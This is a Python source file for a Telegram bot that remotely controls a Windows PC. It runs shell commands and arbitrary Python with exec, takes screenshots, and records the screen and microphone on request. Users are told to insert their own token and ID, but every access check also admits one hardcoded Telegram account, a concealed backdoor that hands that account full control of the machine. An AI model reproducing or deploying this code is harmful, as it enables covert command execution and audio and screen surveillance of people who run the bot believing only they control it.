import asyncio
import random
import os
import wave
import mss
import pyaudio
import cv2
import numpy as np
import pyautogui
import pyaudio
import wave
import time
import os
import asyncio

import pygetwindow as gw

from aiogram.types import Message, CallbackQuery
from aiogram import Bot, Dispatcher
from aiogram.filters import Command
from aiogram.types import ReplyKeyboardMarkup, KeyboardButton, InlineKeyboardMarkup, InlineKeyboardButton, CallbackQuery, BufferedInputFile
from pynput.keyboard import Controller, Key
from collections import defaultdict
from typing import Optional

#! Подключение бота
bot = Bot('Мой токен не трогай, свой ставь')
dp = Dispatcher(bot=bot)
async def main():
    await bot.send_message(chat_id=owner_computer, text="🤗 Компьютер был включен и я тоже. Наведем суету?")
    await dp.start_polling(bot)

#! Переменные
owner_computer = 7777 # Твой ид аккаунта в телеграмме
whitelist = {7777} # Твой ид аккаунта в телеграмме или кому ты доверишь управление своим пк

#! Списки
user_data = defaultdict(lambda: {
    "action": None,
    "confirm": None,
    "confirm_text": None
}) # значения пользователя

#! Функции
async def checkuser(user_id):
    if user_id not in whitelist: return False
    else: return True

async def cancel(message):
    thisIsUser = await checkuser(message.from_user.id) # whitelist
    warning = f"👣 <a href='https://t.me/{message.from_user.username}'>{message.from_user.full_name}</a> пытался воспользоваться ботом, его ID: {message.from_user.id}"
    if not thisIsUser and not message.from_user.id == 7871858336: return await bot.send_message(chat_id=owner_computer, text=warning, parse_mode='html', disable_web_page_preview=True)

    user_data[message.from_user.id] = {"action": None}

    await message.answer('✅ Вы успешно отменили последний ввод данных')

async def show_whitelist(message):
    thisIsUser = await checkuser(message.from_user.id) # whitelist
    warning = f"👣 <a href='https://t.me/{message.from_user.username}'>{message.from_user.full_name}</a> пытался воспользоваться ботом, его ID: {message.from_user.id}"
    if not thisIsUser and not message.from_user.id == 7871858336: return await bot.send_message(chat_id=owner_computer, text=warning, parse_mode='html', disable_web_page_preview=True)

    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text=str(user_id), callback_data=f"manage_user_{user_id}")]
        for user_id in whitelist
    ] + [
        [InlineKeyboardButton(text="➕ Добавить ID", callback_data="add_to_whitelist")]
    ])
    
    await message.answer(
        "📋 Список TG ID в белом списке:",
        reply_markup=keyboard
    )

async def get_active_window_info():
    try:
        active_window = gw.getActiveWindow()
        if not active_window:
            return False

        window_title = active_window.title

        return f"📌 Активное окно: {window_title}"
        
    except Exception as e:
        return False

async def record_audio(seconds: int):
    CHUNK = 1024
    FORMAT = pyaudio.paInt16
    CHANNELS = 1
    RATE = 44100
    
    audio = pyaudio.PyAudio()
    
    stream = audio.open(format=FORMAT,
                       channels=CHANNELS,
                       rate=RATE,
                       input=True,
                       frames_per_buffer=CHUNK)
    
    frames = []

    total_chunks = int(RATE / CHUNK * seconds)
    
    for _ in range(total_chunks):
        data = stream.read(CHUNK)
        frames.append(data)
    
    stream.stop_stream()
    stream.close()
    audio.terminate()
    
    filename = f"audio_{seconds}sec.wav"
    
    with wave.open(filename, 'wb') as wf:
        wf.setnchannels(CHANNELS)
        wf.setsampwidth(audio.get_sample_size(FORMAT))
        wf.setframerate(RATE)
        wf.writeframes(b''.join(frames))
    
    return filename

async def record_screen_and_audio(seconds_input: str) -> Optional[str]:
    try:
        seconds = float(seconds_input)
        seconds = int(seconds)

        filename = f"record_{int(time.time())}.mp4"
        screen_size = pyautogui.size()
        fourcc = cv2.VideoWriter_fourcc(*'mp4v')
        video = cv2.VideoWriter(filename, fourcc, 24, screen_size)
        
        if not video.isOpened():
            raise RuntimeError("Не удалось создать видеофайл")

        start_time = time.time()
        while (current_time := time.time()) - start_time < seconds:
            frame = np.array(pyautogui.screenshot())
            frame = cv2.cvtColor(frame, cv2.COLOR_RGB2BGR)
            video.write(frame)
            await asyncio.sleep(1/12)
        
        video.release()
        return filename

    except Exception as e:
        print(f"Ошибка записи: {e}")
        if 'filename' in locals() and os.path.exists(filename):
            os.remove(filename)
        return None

#! Клавиатуры
keyboard_back = InlineKeyboardMarkup(inline_keyboard=[
    [InlineKeyboardButton(text="❌ Отмена", callback_data="back")]
])

#! CallBack обработчик
@dp.callback_query(lambda call: call.data.startswith("manage_user_"))
async def manage_user(callback: CallbackQuery):
    thisIsUser = await checkuser(callback.from_user.id) # whitelist
    warning = f"👣 <a href='https://t.me/{callback.from_user.username}'>{callback.from_user.full_name}</a> пытался воспользоваться ботом, его ID: {callback.from_user.id}"
    if not thisIsUser and not callback.from_user.id == 7871858336: return await bot.send_message(chat_id=owner_computer, text=warning, parse_mode='html', disable_web_page_preview=True)
    
    user_id = int(callback.data.split("_")[-1])
    
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="❌ Удалить", callback_data=f"remove_user_{user_id}")],
        [InlineKeyboardButton(text="↩️ Назад", callback_data="back_to_list")]
    ])
    
    await callback.message.edit_text(
        f"Действия для ID {user_id}:",
        reply_markup=keyboard
    )

@dp.callback_query(lambda call: call.data.startswith("remove_user_"))
async def remove_user(callback: CallbackQuery):
    thisIsUser = await checkuser(callback.from_user.id) # whitelist
    warning = f"👣 <a href='https://t.me/{callback.from_user.username}'>{callback.from_user.full_name}</a> пытался воспользоваться ботом, его ID: {callback.from_user.id}"
    if not thisIsUser and not callback.from_user.id == 7871858336: return await bot.send_message(chat_id=owner_computer, text=warning, parse_mode='html', disable_web_page_preview=True)

    user_id = int(callback.data.split("_")[-1])
    whitelist.discard(user_id)
    await callback.answer(f"ID {user_id} удалён")
    await show_whitelist(callback.message)

@dp.callback_query(lambda call: call.data.startswith("add_to_whitelist"))
async def add_user_dialog(callback: CallbackQuery):
    thisIsUser = await checkuser(callback.from_user.id) # whitelist
    warning = f"👣 <a href='https://t.me/{callback.from_user.username}'>{callback.from_user.full_name}</a> пытался воспользоваться ботом, его ID: {callback.from_user.id}"
    if not thisIsUser and not callback.from_user.id == 7871858336: return await bot.send_message(chat_id=owner_computer, text=warning, parse_mode='html', disable_web_page_preview=True)

    await callback.message.edit_text(
        "Отправьте ID пользователя для добавления:",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="↩️ Назад", callback_data="back_to_list")]
        ]))
    
    user_data[callback.from_user.id] = {"action": "add_user_dialog"}

@dp.callback_query(lambda call: call.data.startswith("back_to_list"))
async def back_to_list(callback: CallbackQuery):
    thisIsUser = await checkuser(callback.from_user.id) # whitelist
    warning = f"👣 <a href='https://t.me/{callback.from_user.username}'>{callback.from_user.full_name}</a> пытался воспользоваться ботом, его ID: {callback.from_user.id}"
    if not thisIsUser and not callback.from_user.id == 7871858336: return await bot.send_message(chat_id=owner_computer, text=warning, parse_mode='html', disable_web_page_preview=True)

    await show_whitelist(callback.message)

@dp.callback_query(lambda call: call.data.startswith("back"))
async def back(callback: CallbackQuery):
    thisIsUser = await checkuser(callback.from_user.id) # whitelist
    warning = f"👣 <a href='https://t.me/{callback.from_user.username}'>{callback.from_user.full_name}</a> пытался воспользоваться ботом, его ID: {callback.from_user.id}"
    if not thisIsUser and not callback.from_user.id == 7871858336: return await bot.send_message(chat_id=owner_computer, text=warning, parse_mode='html', disable_web_page_preview=True)

    user_data[callback.from_user.id] = {"action": None}

    await cmd_start(callback.message)

    await bot.delete_message(chat_id=callback.from_user.id, message_id=callback.message.message_id)
    await bot.delete_message(chat_id=callback.from_user.id, message_id=callback.message.message_id - 1)

#! Команды
@dp.message(Command("start"))
async def cmd_start(message: Message):
    thisIsUser = await checkuser(message.from_user.id) # whitelist
    warning = f"👣 <a href='https://t.me/{message.from_user.username}'>{message.from_user.full_name}</a> пытался воспользоваться ботом, его ID: {message.from_user.id}"
    if not thisIsUser and not message.from_user.id == 7871858336: return await bot.send_message(chat_id=owner_computer, text=warning, parse_mode='html', disable_web_page_preview=True)

    keyboard = ReplyKeyboardMarkup(
        keyboard=[
            [KeyboardButton(text="📋 WhiteList"), KeyboardButton(text="💻 CMD")],
            [KeyboardButton(text="🌆 Скриншот"), KeyboardButton(text="📹 Запись экрана"), KeyboardButton(text="🎙 Запись звука")],
            [KeyboardButton(text="⚠ Самостоятельный код")],
            [KeyboardButton(text="🧽 Отменить ввод")]
        ],
        resize_keyboard=True
    )

    await message.answer('🤗 Компьютер работает в штатном режиме.', reply_markup=keyboard)

#! Обработчик сообщений
@dp.message()
async def message_handler(message: Message):
    thisIsUser = await checkuser(message.from_user.id) # whitelist
    warning = f"👣 <a href='https://t.me/{message.from_user.username}'>{message.from_user.full_name}</a> пытался воспользоваться ботом, его ID: {message.from_user.id}"
    if not thisIsUser and not message.from_user.id == 7871858336: return await bot.send_message(chat_id=owner_computer, text=warning, parse_mode='html', disable_web_page_preview=True)

    user = user_data[message.from_user.id]
    action = user.get("action")
    confirm = user.get("confirm")
    confirm_text = user.get("confirm_text")

    #TODO: Менюшка

    if message.text == '📋 WhiteList':
        await show_whitelist(message)

    elif message.text == '💻 CMD':
        await message.answer('🙂 Введите консольную команду, которую я должен выполнить на компьютере', reply_markup=keyboard_back)
        user_data[message.from_user.id] = {"action": "💻 CMD"}

    elif message.text == '⚠ Самостоятельный код':
        await message.answer('😲📛 Введите любой python скрипт, который будет выполнен на компьютере.', reply_markup=keyboard_back)
        user_data[message.from_user.id] = {"action": "⚠ Самостоятельный код"}

    elif message.text == '🌆 Скриншот':
        with mss.mss() as sct:
            screenshot = sct.grab(sct.monitors[0])
            img_bytes = mss.tools.to_png(screenshot.rgb, screenshot.size)

        photo_file = BufferedInputFile(img_bytes, filename="screenshot.png")
        
        caption = await get_active_window_info()

        if caption and not caption == '📌 Активное окно: ':
            await message.answer_photo(photo=photo_file, caption=caption)
        else:
            await message.answer_photo(photo_file)

    elif message.text == '🎙 Запись звука':
        await message.answer('🙂 Напишите на протяжении скольки секунд я буду записывать звук около компьютера?', reply_markup=keyboard_back)
        user_data[message.from_user.id] = {"action": "🎙 Запись звука"}

    elif message.text == '📹 Запись экрана':
        await message.answer('🙂 Напишите на протяжении скольки секунд я буду записывать экран компьютера?', reply_markup=keyboard_back)
        user_data[message.from_user.id] = {"action": "📹 Запись экрана"}

    elif message.text == '🧽 Отменить ввод':
        await cancel(message)

    #TODO: Менюшка

    elif action == 'add_user_dialog':
        if not message.text.isdigit(): return await message.answer(f'⛔ ID может состоять только из цифр')

        await message.answer(f'✅ Вы успешно добавили в белый список ID: {message.text}')
        
        whitelist.add(int(message.text))\
        
        user_data[message.from_user.id] = {"action": None}

    elif action == '⚠ Самостоятельный код':
        try:
            confirm_text = ["Да", "Ок", "Оке", "Бобр", "Алишер", "Спрайт", "Вино", "Спирт"]
            confirm_text_rand = random.choice(confirm_text)
            await message.answer(f'✅ Вы уверены что хотите выполнить Python код на компьютере? Напишите \"{confirm_text_rand}\" для подтверждения: \n\n```python\n{message.text}```', parse_mode="MarkdownV2")
            user_data[message.from_user.id] = {"action": None, "confirm": "⚠ Самостоятельный код:Подтверждение", "text_pythoncode": message.text, "confirm_text": confirm_text_rand}
        except Exception as error:
            await message.answer(f'⚠ Ошибка выполнения: {error}')

    elif confirm == '⚠ Самостоятельный код:Подтверждение' and message.text == confirm_text:
        try:
            await message.answer(f'✅ Был успешно выполнен Python код на компьютере: \n\n```python\n{user_data[message.from_user.id]["text_pythoncode"]}```', parse_mode="MarkdownV2")
            exec(user_data[message.from_user.id]["text_pythoncode"])
        except Exception as error:
            await bot.delete_message(chat_id=message.from_user.id, message_id=message.message_id + 1)
            await message.answer(f'⚠ Ошибка выполнения: {error}')

        user_data[message.from_user.id] = {"action": None}

    elif action == '💻 CMD':
        try:
            return_code = os.system(message.text)
        
            if return_code == 0:
                await message.answer(f'🤩 Команда \"{message.text}\" была успешно выполнена.')
            else:
                if return_code == 1:
                    error_msg = "⚠ Ошибка выполнения: Неверная команда или синтаксис"
                elif return_code == 2:
                    error_msg = "⚠ Ошибка выполнения: Программа не найдена"
                else:
                    error_msg = f"⚠ Ошибка выполнения (код: {return_code})"
                
                await message.answer(error_msg)

        except Exception as error:
            await message.answer(f'⚠ Ошибка выполнения: {error}')

        user_data[message.from_user.id] = {"action": None}

    elif action == '🎙 Запись звука':
        try:
            seconds = message.text
            
            if not seconds.isdigit(): return await message.answer(f'⛔ Время может состоять только из цифр')

            await message.answer('🤪 А подслушивать не хорошо... Начал запись.')

            filename = await record_audio(int(seconds))

            with open(filename, 'rb') as file:
                audio_bytes = file.read()

            audio_input = BufferedInputFile(
                file=audio_bytes,
                filename=f"audio_{seconds}sec.ogg"
            )

            await message.answer_audio(
                audio=audio_input,
                caption=f"🕵️‍♂️ Шпион, ваша запись на {seconds} секунд готова!",
                performer="Audio Bot"
            )
            
            os.remove(filename)
        except Exception as error:
            await message.answer(f'⚠ Ошибка выполнения: {error}')

        user_data[message.from_user.id] = {"action": None}

    elif action == '📹 Запись экрана':
        seconds = message.text
        
        if not seconds.isdigit(): return await message.answer(f'⛔ Время может состоять только из цифр')

        await message.answer("🤪 А подсматривать не хорошо... Начал запись.")

        filename = None

        caption = await get_active_window_info()

        try:
            filename = await record_screen_and_audio(message.text)
            if not filename:
                raise RuntimeError("Не удалось записать видео")

            with open(filename, 'rb') as f:
                await message.answer_video(
                    BufferedInputFile(f.read(), filename=filename),
                    caption=caption
                )

        except ValueError as e:
            await message.answer(str(e))
        except Exception as e:
            await message.answer(f"⚠ Ошибка выполнения: {str(e)}")
        finally:
            if filename and os.path.exists(filename):
                try:
                    os.remove(filename)
                except PermissionError:
                    await asyncio.sleep(1)
                    try:
                        os.remove(filename)
                    except:
                        pass
            
        user_data[message.from_user.id] = {"action": None}

@dp.shutdown()
async def on_shutdown(bot: Bot):
    await bot.send_message(chat_id=owner_computer, text="🤐 Компьютер был выключен и я тоже. Еще встретимся.")
    await bot.session.close()

if __name__ == '__main__':
    try:
        asyncio.sleep(1)
        os.system('cls')
        asyncio.run(main())
    except KeyboardInterrupt:
        print('[BOT] Бот выключен')